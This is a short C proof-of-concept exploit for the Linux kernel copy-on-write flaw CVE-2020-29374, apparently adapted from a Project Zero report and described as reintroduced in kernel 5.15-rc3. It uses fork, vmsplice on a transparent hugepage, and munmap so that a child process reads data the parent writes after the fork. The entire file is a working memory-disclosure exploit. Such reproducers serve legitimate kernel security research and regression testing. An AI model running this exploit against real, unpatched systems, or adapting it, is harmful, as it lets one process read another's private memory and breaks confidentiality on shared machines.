/*
 * Slightly modified version of the CVE-2020-29374 exploit:
 * https://bugs.chromium.org/p/project-zero/issues/detail?id=2045
 *
 * From: Jann Horn <jannh@google.com> fixed in
 * 17839856fd588f4ab6b789f482ed3ffd7c403e1f, but reintroduced and still
 * affects v5.15-rc3 commit 4de593fb965fc2bd11a0b767e0c65ff43540a6e4
 *
 * Fixed in https://gitlab.com/aarcange/aa/-/tree/mapcount_unshare
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <err.h>
#include <unistd.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <sys/wait.h>

#define SYSCHK(x) ({          \
  typeof(x) __res = (x);      \
  if (__res == (typeof(x))-1) \
    err(1, "SYSCHK(" #x ")"); \
  __res;                      \
})

static void *data;

static void child_fn(void) {
  int pipe_fds[2];
  SYSCHK(pipe(pipe_fds));
  struct iovec iov = {.iov_base = data, .iov_len = 2*1024*1024 };
  SYSCHK(vmsplice(pipe_fds[1], &iov, 1, 0));
  SYSCHK(munmap(data, 2*1024*1024));
  sleep(2);
  char buf[2*1024*1024];
  SYSCHK(read(pipe_fds[0], buf, 2*1024*1024));
  printf("read string from child: %s\n", buf);
}

int main(void) {
  if (posix_memalign(&data, 2*1024*1024, 2*1024*1024))
    errx(1, "posix_memalign()");
  if (madvise(data, 2*1024*1024, MADV_HUGEPAGE))
    errx(1, "madvise()");
  strcpy(data, "BORING DATA");

  pid_t child = SYSCHK(fork());
  if (child == 0) {
    child_fn();
    return 0;
  }

  sleep(1);
  strcpy(data, "THIS IS SECRET");

  int status;
  SYSCHK(wait(&status));
}
